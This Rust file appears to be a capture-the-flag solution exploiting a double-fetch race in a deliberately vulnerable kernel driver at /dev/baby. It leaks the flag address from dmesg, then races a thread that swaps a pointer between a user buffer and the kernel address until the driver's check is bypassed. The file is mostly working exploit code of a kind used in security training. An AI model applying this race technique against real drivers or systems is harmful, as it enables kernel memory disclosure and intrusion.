use libc;
use regex::Regex;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Read, Write};
use std::os::fd::{AsFd, AsRawFd};
use std::process::Command;

const competetion_times: i32 = 0x1000;
static mut status: bool = true;
static mut real_addr: u64 = 0;
static mut buf_addr: *const libc::c_char = std::ptr::null();
struct FLAG {
    flag_addr: *const libc::c_char,
    flag_len: u32,
}

static mut flag: FLAG = unsafe {
    FLAG {
        flag_addr: buf_addr,
        flag_len: 33,
    }
};
extern "C" fn competetion_thread(_: *mut libc::c_void) -> *mut libc::c_void {
    while unsafe { status } {
        for _ in 0..competetion_times {
            unsafe { flag.flag_addr = std::mem::transmute(real_addr) }
        }
    }
    std::ptr::null_mut()
}

fn main() -> io::Result<()> {
    let buf = std::ffi::CString::new("chongtianshuo").expect("字符串都做不出来！");
    unsafe { buf_addr = std::mem::transmute(buf.as_ptr()) }
    let fd: File = OpenOptions::new()
        .write(true)
        .read(true)
        .open("/dev/baby")?;
    unsafe {
        libc::ioctl(fd.as_raw_fd(), 0x6666);
    }
    let output = Command::new("sh")
        .arg("-c")
        .arg("dmesg | grep flag")
        .output()
        .expect("flag 执行失败");
    let output = String::from_utf8(output.stdout).expect("output转译失败");
    let re = Regex::new(r"([a-fA-F0-9]{16,})").expect("正则生成失败");
    let caps = re.captures(output.as_str()).unwrap();
    let flag_addr = &caps[0];
    let flag_addr = u64::from_str_radix(flag_addr, 16).unwrap();
    unsafe {
        real_addr = std::mem::transmute(flag_addr);
        let mut thread: libc::pthread_t = std::mem::zeroed();
        libc::pthread_create(
            &mut thread,
            std::ptr::null(),
            competetion_thread,
            std::ptr::null_mut(),
        );
        while status {
            for _ in 0..competetion_times {
                flag.flag_addr = buf_addr;
                libc::ioctl(fd.as_raw_fd(), 0x1337, &flag);
            }
            Command::new("sh")
                .arg("-c")
                .arg("dmesg | grep flag > result.txt")
                .output()
                .expect("flag 执行失败");

            let result_fd = OpenOptions::new()
                .write(true)
                .read(true)
                .create(true)
                .open("./result.txt")?;

            let mut reader = BufReader::new(result_fd);
            for line in reader.lines() {
                if line.unwrap().contains("flag{") {
                    status = false;
                }
            }
        }
        libc::pthread_cancel(thread);
        println!("all is over");
        let output = Command::new("sh")
            .arg("-c")
            .arg("dmesg | grep flag")
            .output()
            .expect("flag 执行失败");
        println!("{}", String::from_utf8(output.stdout).unwrap())
    }
    io::Result::Ok(())
}
